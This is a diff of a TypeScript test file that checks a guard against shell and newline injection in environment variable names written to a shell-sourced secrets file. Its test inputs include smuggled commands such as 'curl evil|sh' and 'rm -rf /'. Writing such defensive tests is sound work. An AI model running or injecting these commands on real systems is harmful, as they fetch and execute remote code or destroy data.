@@ -11,6 +11,7 @@ import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import { chmodSync, existsSync, mkdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import {
+  isSafeEnvVarName,
   isValidEnvVarName,
   removeKeyFromSecretsEnv,
   secretsEnvHasKey,
@@ -22,6 +23,41 @@ import {
 function tag(): string {
   return `${process.pid}-${Math.floor(Math.random() * 1_000_000)}`;
 }
+
+describe("env var name guard", () => {
+  // Point HOME at a scratch dir so that even if the guard ever regressed, a
+  // write could not touch the developer's real ~/.gini/secrets.env.
+  let scratchHome: string;
+  let prevHome: string | undefined;
+  beforeEach(() => {
+    scratchHome = `/tmp/gini-secrets-env-guard/${tag()}`;
+    rmSync(scratchHome, { recursive: true, force: true });
+    mkdirSync(scratchHome, { recursive: true });
+    prevHome = process.env.HOME;
+    process.env.HOME = scratchHome;
+  });
+  afterEach(() => {
+    if (prevHome === undefined) delete process.env.HOME;
+    else process.env.HOME = prevHome;
+    rmSync(scratchHome, { recursive: true, force: true });
+  });
+
+  test("accepts plain identifiers, rejects shell/regex-injection names", () => {
+    expect(isSafeEnvVarName("ANTHROPIC_API_KEY")).toBe(true);
+    expect(isSafeEnvVarName("_X1")).toBe(true);
+    expect(isSafeEnvVarName("FOO=x; curl evil|sh #")).toBe(false);
+    expect(isSafeEnvVarName("BAD NAME")).toBe(false);
+    expect(isSafeEnvVarName("LINE\nINJECT")).toBe(false);
+    expect(isSafeEnvVarName("1LEADING")).toBe(false);
+    expect(isSafeEnvVarName("")).toBe(false);
+  });
+
+  test("write throws on an unsafe name (never reaches the shell-sourced file); remove/has no-op", () => {
+    expect(() => writeKeyToSecretsEnv("FOO=x; rm -rf /", "v")).toThrow(/unsafe env var name/);
+    expect(removeKeyFromSecretsEnv("BAD NAME")).toBe(false);
+    expect(secretsEnvHasKey("BAD NAME")).toBe(false);
+  });
+});
 
 describe("writeKeyToSecretsEnv", () => {
   let scratchHome: string;
@@ -195,11 +231,12 @@ describe("env-var name validation", () => {
     expect(isValidEnvVarName("")).toBe(false);
   });
 
-  test("the writer and remover reject a malformed name instead of injecting it", () => {
-    // A name carrying `=` or a newline would otherwise inject an extra line
-    // into the shell-sourced secrets.env. The guard runs before any filesystem
-    // access, so no sandbox is needed.
-    expect(() => writeKeyToSecretsEnv("FOO=evil\nexport BAR", "v")).toThrow(/Invalid environment variable name/);
-    expect(() => removeKeyFromSecretsEnv("FOO=evil\nexport BAR")).toThrow(/Invalid environment variable name/);
+  test("the writer rejects, and the remover no-ops on, a malformed name instead of injecting it", () => {
+    // A name carrying `=` or a newline would otherwise inject an extra line into
+    // the shell-sourced secrets.env. The guard runs before any filesystem access,
+    // so no sandbox is needed. The writer throws; the remover treats an
+    // unwritable name as nothing-to-remove (false) without touching the file.
+    expect(() => writeKeyToSecretsEnv("FOO=evil\nexport BAR", "v")).toThrow(/unsafe env var name/);
+    expect(removeKeyFromSecretsEnv("FOO=evil\nexport BAR")).toBe(false);
   });
 });
